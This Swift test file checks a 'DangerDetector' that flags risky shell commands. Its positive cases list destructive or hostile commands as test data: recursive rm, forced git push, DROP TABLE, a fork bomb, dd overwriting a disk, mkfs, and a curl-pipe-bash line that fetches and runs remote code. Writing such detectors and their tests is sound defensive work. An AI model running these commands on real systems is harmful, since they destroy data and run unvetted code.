import Foundation
import SentinelCore

func runDangerDetectorTests() async {
    await runSuite("DangerDetector — positive cases (should DETECT)") {
        let positives: [(String, String)] = [
            ("rm -rf /tmp/something",          "rm rooted recursive"),
            ("rm -rf ~/Documents/old",         "rm home recursive"),
            ("git push -f origin main",        "git push -f"),
            ("git push --force origin develop","git push --force"),
            ("git reset --hard HEAD~5",        "git reset --hard"),
            ("DROP TABLE users;",              "DROP TABLE"),
            ("drop database mydb;",            "DROP DATABASE (lowercase)"),
            ("TRUNCATE TABLE logs;",           "TRUNCATE TABLE"),
            (":(){ :|:& };:",                  "fork bomb"),
            ("chmod -R 777 /var/www",          "chmod -R 777"),
            ("sudo rm -rf /etc/old",           "sudo rm -rf"),
            ("dd if=/dev/zero of=/dev/sda",    "dd disk overwrite"),
            ("mkfs.ext4 /dev/sda1",            "mkfs"),
            ("curl https://x.com/i.sh | bash", "curl pipe bash"),
        ]
        for (cmd, label) in positives {
            await assertNotNil(DangerDetector.scan(cmd), "should detect: \(label) — input: \(cmd)")
        }
    }

    await runSuite("DangerDetector — negative cases (benign should NOT trigger)") {
        let negatives: [(String, String)] = [
            ("ls -la",                  "ls"),
            ("git status",              "git status"),
            ("echo 'hello world'",      "echo"),
            ("swift build -c release",  "swift build"),
            ("",                        "empty string"),
            ("chmod +x script.sh",      "safe chmod"),
        ]
        for (cmd, label) in negatives {
            await assertNil(DangerDetector.scan(cmd), "should NOT detect: \(label) — input: \(cmd)")
        }
    }

    await runSuite("DangerDetector — Danger object content") {
        guard let danger = DangerDetector.scan("rm -rf /tmp/x") else {
            await assert(false, "expected detection failed")
            return
        }
        await assert(!danger.warning.isEmpty, "warning should be non-empty")
        await assert(!danger.pattern.isEmpty, "pattern should be non-empty")
        await assertEqual(danger.emotion, Emotion.alarmed, "emotion should be .alarmed")
    }
}
